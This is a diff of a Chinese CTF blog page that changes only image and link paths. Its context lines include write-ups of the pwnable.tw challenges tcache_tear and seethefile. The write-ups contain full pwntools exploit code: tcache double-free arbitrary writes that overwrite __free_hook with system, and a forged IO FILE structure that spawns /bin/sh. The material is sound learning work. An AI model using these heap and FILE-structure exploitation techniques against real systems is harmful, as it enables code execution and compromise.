-<p><img src="/2021/02/25/18-40-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220184904076.png" alt="image-20210220184904076"></p>
+<p><img src="/2021/02/25/18-40-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220184904076.png" alt="image-20210220184904076"></p>
 <h4 id="构造unsortedbin"><a href="#构造unsortedbin" class="headerlink" title="构造unsortedbin"></a>构造unsortedbin</h4><p>因为要检查释放的chunk和nextchunk的标志位是否为1。【标志位是下一个chunk的大小&amp;1】，所以，我们需要构造chunk+两个绕过检验的chunk</p>
 <div class="table-container">
 <table>
@@ -1549,7 +1549,7 @@
 <p>chunk2的1检验chunk1，chunk3的1检验chunk2。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#0x500=&gt;0x490(chunk size)+0x10(chunk head)</span></span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)<span class="comment">#让chunk中有数据，并且，malloc的时候，ptr指向name_bss+0x10</span></span><br><span class="line">free()<span class="comment">#将构造的chunkfree</span></span><br></pre></td></tr></table></figure>
 <p>得到到main_arena，计算libc基址【得到的main_arena-本次libc机制得到偏移】</p>
-<p><img src="/2021/02/25/18-40-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220193540189.png" alt="image-20210220193540189"></p>
+<p><img src="/2021/02/25/18-40-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210220193540189.png" alt="image-20210220193540189"></p>
 <h4 id="覆盖free-hook为system"><a href="#覆盖free-hook为system" class="headerlink" title="覆盖free_hook为system"></a>覆盖free_hook为system</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc_base = main_arena - <span class="number">0x3EBCA0</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">print(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">aaw(<span class="number">0x70</span>,free_hook,p64(system))</span><br></pre></td></tr></table></figure>
 <p>最后malloc一个内容为system参数的chunk，free即可getshell</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">"./tcache_tear"</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./tw_libc-2.27.so"</span>&#125;)</span><br><span class="line"><span class="comment">#p=remote("chall.pwnable.tw",10207)</span></span><br><span class="line">libc = ELF(<span class="string">'./tw_libc-2.27.so'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sla	= <span class="keyword">lambda</span> delim,data		: p.sendlineafter(delim,data)</span><br><span class="line">cmd	= <span class="keyword">lambda</span> choice			: sla(<span class="string">"Your choice :"</span>,str(choice))</span><br><span class="line">init	= <span class="keyword">lambda</span> name			: sla(<span class="string">"Name:"</span>,name)</span><br><span class="line">malloc	= <span class="keyword">lambda</span> size,data		: (cmd(<span class="number">1</span>),sla(<span class="string">"Size:"</span>,str(size)),sla(<span class="string">"Data:"</span>,data))</span><br><span class="line">free	= <span class="keyword">lambda</span> 			: cmd(<span class="number">2</span>)</span><br><span class="line">info	= <span class="keyword">lambda</span>			: cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span><span class="params">(len,addr,data)</span>:</span></span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	free()</span><br><span class="line">	free()</span><br><span class="line">	malloc(len,p64(addr))</span><br><span class="line">	malloc(len,<span class="string">'aaaa'</span>)</span><br><span class="line">	malloc(len,data)</span><br><span class="line"></span><br><span class="line">name_bss = <span class="number">0x00602060</span></span><br><span class="line"></span><br><span class="line">init(p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>))</span><br><span class="line">aaw(<span class="number">0x50</span>,name_bss+<span class="number">0x500</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line">aaw(<span class="number">0x60</span>,name_bss+<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">"Name :"</span>);p.recv(<span class="number">0x10</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">0x8</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3EBCA0</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">print(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">aaw(<span class="number">0x70</span>,free_hook,p64(system))</span><br><span class="line">malloc(<span class="number">0x40</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -1557,15 +1557,15 @@
 <h2 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h2><blockquote>
 <p>栈溢出+io file的题</p>
 </blockquote>
-<p><img src="/2021/02/25/18-40-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225183413269.png" alt="image-20210225183413269"></p>
+<p><img src="/2021/02/25/18-40-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225183413269.png" alt="image-20210225183413269"></p>
 <p>输入name的时候没有长度限制，栈溢出，而name下面是fp变量，可以覆盖</p>
 <h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h3><p>因为可以直接读文件，所以<code>/proc/id(self)/maps</code>可以直接读</p>
 <h3 id="伪造IO-FILE结构"><a href="#伪造IO-FILE结构" class="headerlink" title="伪造IO FILE结构"></a>伪造IO FILE结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fakeFILE = <span class="number">0x0804B284</span><span class="comment">#伪造的地址</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">name += p32(fakeFILE)<span class="comment">#FILE的地址</span></span><br><span class="line"></span><br><span class="line">FILE = p32(<span class="number">0xffffdfff</span>)<span class="comment">#绕过验证</span></span><br><span class="line">FILE += <span class="string">";/bin/sh"</span><span class="comment">#参数，因为不是地址，故可以前面加;或者||直接填</span></span><br><span class="line">FILE = FILE.ljust(<span class="number">0x94</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">name += FILE</span><br><span class="line">name += p32(fakeFILE+<span class="number">0x98</span>)</span><br><span class="line">name += p32(system)*<span class="number">3</span><span class="comment">#vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好</span></span><br></pre></td></tr></table></figure>
 <h3 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd home</span><br><span class="line">cd seethefile</span><br></pre></td></tr></table></figure>
 <p>下面有这些文件</p>
-<p><img src="/2021/02/25/18-40-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185641105.png" alt="image-20210225185641105"></p>
+<p><img src="/2021/02/25/18-40-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185641105.png" alt="image-20210225185641105"></p>
 <p>执行get_flag可以获得，查看源码可得需要输入字符串<code>Give me the flag</code></p>
-<p><img src="/2021/02/25/18-40-undefined/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185601647.png" alt="image-20210225185601647"></p>
+<p><img src="/2021/02/25/18-40-Shuwen/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210225185601647.png" alt="image-20210225185601647"></p>
 <p>参考：</p>
 <ul>
 <li><a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/" target="_blank" rel="noopener">pwnable.tw系列</a></li>
@@ -1590,7 +1590,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/18/09-35-undefined/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/18/09-35-Shuwen/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/shuwen.jpg">
@@ -1604,7 +1604,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/02/18/09-35-undefined/" class="post-title-link" itemprop="url">编译debug版本的glibc</a>
+            <a href="/2021/02/18/09-35-Shuwen/" class="post-title-link" itemprop="url">编译debug版本的glibc</a>
         </h2>
 
         <div class="post-meta">
